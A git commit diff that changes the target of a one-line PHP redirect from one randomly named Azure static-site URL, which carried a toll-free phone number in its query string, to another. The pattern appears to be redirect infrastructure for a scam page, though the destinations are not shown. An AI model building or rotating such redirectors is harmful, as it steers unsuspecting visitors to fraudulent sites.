f5122e56d550bff0e908ecdaa0f9e03d73ad9c55
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-11-10 21:05:19 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,6 @@
 <?php
 // Define the destination URL
-$destination_url = "https://max87coe8fic7gwb8fixx8.z36.web.core.windows.net/index.html?Aniph=1-855-458-7201";
+$destination_url = "https://ad23dsmaxx87core8s.z1.web.core.windows.net/";
 
 // Send the Location header for redirection
 header("Location: " . $destination_url);
